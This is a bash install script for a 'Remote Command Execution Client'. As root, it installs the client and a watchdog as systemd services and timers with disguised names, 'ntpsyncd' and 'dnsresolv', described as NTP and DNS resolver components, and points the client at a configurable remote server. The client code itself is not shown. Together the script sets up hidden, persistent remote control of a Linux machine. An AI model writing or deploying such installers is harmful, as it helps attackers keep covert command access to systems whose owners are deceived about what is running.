#!/bin/bash
#
# Installation script for Remote Command Execution Client
# This script installs the client as a systemd service with monitoring
#

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
INSTALL_DIR="/etc/ntpsync"
MONITOR_DIR="/etc/dnsresolve"
SCRIPT_NAME="ntp"
SERVICE_NAME="ntpsyncd"
TIMER_NAME="dnsresolv"
SOURCE_SCRIPT="ntp-daemon"
MONITOR_SCRIPT="conf"

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}Error: This script must be run as root${NC}"
    echo "Please run: sudo $0"
    exit 1
fi

echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}Remote Command Execution Client Setup${NC}"
echo -e "${GREEN}=====================================${NC}"
echo ""

# Check if Python 3 is installed
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: Python 3 is not installed${NC}"
    echo "Please install Python 3 first: sudo apt-get install python3 python3-pip"
    exit 1
fi

echo -e "${GREEN}[1/8]${NC} Checking dependencies..."
echo "Python 3 version: $(python3 --version)"

# Install pip if not available
if ! command -v pip3 &> /dev/null; then
    echo -e "${YELLOW}pip3 not found. Installing...${NC}"
    apt-get update
    apt-get install -y python3-pip
fi

# Install python dependencies
echo -e "${GREEN}[2/8]${NC} Installing Python dependencies..."
pip3 install netifaces --break-system-packages 2>/dev/null || pip3 install netifaces

# Create installation directories
echo -e "${GREEN}[3/8]${NC} Creating installation directories..."
mkdir -p "$INSTALL_DIR"
mkdir -p "$MONITOR_DIR"
echo "Created: $INSTALL_DIR"
echo "Created: $MONITOR_DIR"

# Load configuration from .env file
echo -e "${GREEN}[4/8]${NC} Loading configuration..."
if [ ! -f ".env" ]; then
    if [ -f "env.example" ]; then
        echo -e "${YELLOW}Warning: .env not found, using env.example${NC}"
        cp "env.example" ".env"
    else
        echo -e "${RED}Error: No .env or env.example file found${NC}"
        exit 1
    fi
fi

# Source the .env file to get variables
set -a
source .env
set +a

# Set defaults if not specified
SERVER_HOST=${SERVER_HOST:-localhost}
SERVER_PORT=${SERVER_PORT:-8443}
CLIENT_NAME=${CLIENT_NAME:-}

echo "Configuration:"
echo "  SERVER_HOST: $SERVER_HOST"
echo "  SERVER_PORT: $SERVER_PORT"
echo "  CLIENT_NAME: ${CLIENT_NAME:-<auto-detect>}"

# Copy and configure client script
echo -e "${GREEN}[5/8]${NC} Installing client script..."
if [ ! -f "$SOURCE_SCRIPT" ]; then
    echo -e "${RED}Error: $SOURCE_SCRIPT not found in current directory${NC}"
    exit 1
fi

# Create the script with embedded configuration
cp "$SOURCE_SCRIPT" "$INSTALL_DIR/$SCRIPT_NAME"

# Replace placeholders with actual values
sed -i "s|{{SERVER_HOST}}|$SERVER_HOST|g" "$INSTALL_DIR/$SCRIPT_NAME"
sed -i "s|{{SERVER_PORT}}|$SERVER_PORT|g" "$INSTALL_DIR/$SCRIPT_NAME"
sed -i "s|{{CLIENT_NAME}}|$CLIENT_NAME|g" "$INSTALL_DIR/$SCRIPT_NAME"

chmod +x "$INSTALL_DIR/$SCRIPT_NAME"
echo "Installed: $INSTALL_DIR/$SCRIPT_NAME"

# Install monitor script
echo -e "${GREEN}[6/8]${NC} Installing monitor script..."
if [ ! -f "$MONITOR_SCRIPT" ]; then
    echo -e "${RED}Error: $MONITOR_SCRIPT not found in current directory${NC}"
    exit 1
fi

cp "$MONITOR_SCRIPT" "$MONITOR_DIR/$MONITOR_SCRIPT"
chmod +x "$MONITOR_DIR/$MONITOR_SCRIPT"
echo "Installed: $MONITOR_DIR/$MONITOR_SCRIPT"

# Update dnsresolv.service to use the new conf script
echo -e "${GREEN}[7/8]${NC} Installing systemd services..."

# Create dnsresolv.service with correct path
cat > "/etc/systemd/system/${TIMER_NAME}.service" << EOF
[Unit]
Description=DNS Resolver Service Monitor (ntpsyncd watchdog)
After=multi-user.target

[Service]
Type=oneshot
ExecStart=${MONITOR_DIR}/${MONITOR_SCRIPT}

[Install]
WantedBy=multi-user.target
EOF

echo "Installed: /etc/systemd/system/${TIMER_NAME}.service"

# Install systemd service for main client
cp "${SERVICE_NAME}.service" "/etc/systemd/system/${SERVICE_NAME}.service"
echo "Installed: /etc/systemd/system/${SERVICE_NAME}.service"

# Install systemd timer
cp "${TIMER_NAME}.timer" "/etc/systemd/system/${TIMER_NAME}.timer"
echo "Installed: /etc/systemd/system/${TIMER_NAME}.timer"

# Reload systemd
echo -e "${GREEN}[8/8]${NC} Configuring and starting services..."
systemctl daemon-reload

# Enable and start the main service
systemctl enable "${SERVICE_NAME}.service"
systemctl start "${SERVICE_NAME}.service"

# Enable and start the timer
systemctl enable "${TIMER_NAME}.timer"
systemctl start "${TIMER_NAME}.timer"

echo ""
echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}Installation completed successfully!${NC}"
echo -e "${GREEN}=====================================${NC}"
echo ""

# Check service status
echo "Service Status:"
if systemctl is-active --quiet "${SERVICE_NAME}"; then
    echo -e "  ${SERVICE_NAME}: ${GREEN}Active${NC}"
else
    echo -e "  ${SERVICE_NAME}: ${RED}Inactive${NC}"
fi

if systemctl is-active --quiet "${TIMER_NAME}.timer"; then
    echo -e "  ${TIMER_NAME}.timer: ${GREEN}Active${NC}"
else
    echo -e "  ${TIMER_NAME}.timer: ${RED}Inactive${NC}"
fi

echo ""
echo "Useful commands:"
echo "  Check service status:  systemctl status ${SERVICE_NAME}"
echo "  View service logs:     journalctl -u ${SERVICE_NAME} -f"
echo "  Check timer status:    systemctl status ${TIMER_NAME}.timer"
echo "  View timer logs:       journalctl -u ${TIMER_NAME} -f"
echo "  Restart service:       systemctl restart ${SERVICE_NAME}"
echo ""

# Show last few log lines
echo "Recent service logs:"
journalctl -u "${SERVICE_NAME}" -n 10 --no-pager

echo ""
echo -e "${GREEN}Configuration has been embedded in $INSTALL_DIR/$SCRIPT_NAME${NC}"
echo ""
